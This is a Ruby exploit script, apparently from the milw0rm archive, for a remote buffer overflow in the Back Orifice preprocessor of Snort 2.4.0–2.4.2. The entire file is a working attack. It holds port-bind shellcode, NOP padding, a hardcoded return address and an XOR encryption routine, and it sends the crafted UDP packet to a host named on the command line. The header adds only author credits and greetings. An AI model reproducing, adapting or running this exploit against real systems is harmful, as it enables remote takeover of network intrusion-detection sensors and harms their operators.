#!/usr/bin/ruby -w

#
#
# Version 0.1 (Public)
#
# snort 2.4.0 - 2.4.2 Back Orifice Pre-Preprocessor Remote Exploit
#
# by xwings at mysec dot org
# URL : http://www.mysec.org , somebody need to update the page
# 
# Saying Hi to ....
#
# . All the 1337 c0d3r @ pulltheplug.org
# . Gurus from #rubylang @ freenode.net
# . Skywizard @ somewhere right now
# . HITBSecConf CREW and Team Panda
# 
# 03:07 <@mark> hey xwings
# 03:07 <@mark> why don't you come up and see me sometime?
#
# Tested on :
# Linux debian24 2.4.27-2-386 #1 Mon May 16 16:47:51 JST 2005 i686 GNU/Linux
# gcc version 3.3.5 (Debian 1:3.3.5-13)
# Snort 2.4.2 , ./configure && make && make install
#
# Use Ruby : http://www.ruby-lang.org
# 
# 
#

require 'socket'

fathost         = ARGV[0]
packetsize      = 1069 # ret is 1069
targetport      = 9080

boheader =      "*!*QWTY?"  +
                [1096].pack("V")  +           # Length ,thanx Russell Sanford
                "\xed\xac\xef\x0d"+           # ID
                "\x01"                        # PING

## Port Bind 3964 . connectback, refer to Russell Sanford's code

shellcode =     "\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe8"+
                "\x8e\x30\x01\x83\xeb\xfc\xe2\xf4\xd9\x55\x63\x42\xbb\xe4\x32\x6b"+
                "\x8e\xd6\xa9\x88\x09\x43\xb0\x97\xab\xdc\x56\x69\xe7\xf2\x56\x52"+
                "\x61\x6f\x5a\x67\xb0\xde\x61\x57\x61\x6f\xfd\x81\x58\xe8\xe1\xe2"+
                "\x25\x0e\x62\x53\xbe\xcd\xb9\xe0\x58\xe8\xfd\x81\x7b\xe4\x32\x58"+
                "\x58\xb1\xfd\x81\xa1\xf7\xc9\xb1\xe3\xdc\x58\x2e\xc7\xfd\x58\x69"+
                "\xc7\xec\x59\x6f\x61\x6d\x62\x52\x61\x6f\xfd\x81"

filler =        "\x90" * (packetsize-(boheader.length + shellcode.length))

retadd =        [0xbffff370].pack('L')

        
darthcode = (shellcode+filler+retadd)

def msrand(seed)
        @holdrand = 31337 
        end

def mrand()
        return (((@holdrand=@holdrand*(214013 & 0xffffffff)+(2531011 & 0xffffffff))>>16)&0x7fff)
        end

def bocrypt(takepayload)

        @arrpayload = (takepayload.split(//))
       
        encpayload ="".to_s
        @holdrand=0
        msrand(0)
        
        @arrpayload.each do |c|
                encpayload +=((c.unpack("C*").map{ |v| (v^(mrand()%256)) }.join)).to_i.chr
                end
        
        return encpayload
        end

UDPSocket.open.send(bocrypt(boheader+darthcode), 0, fathost, targetport)

# milw0rm.com [2005-11-11]
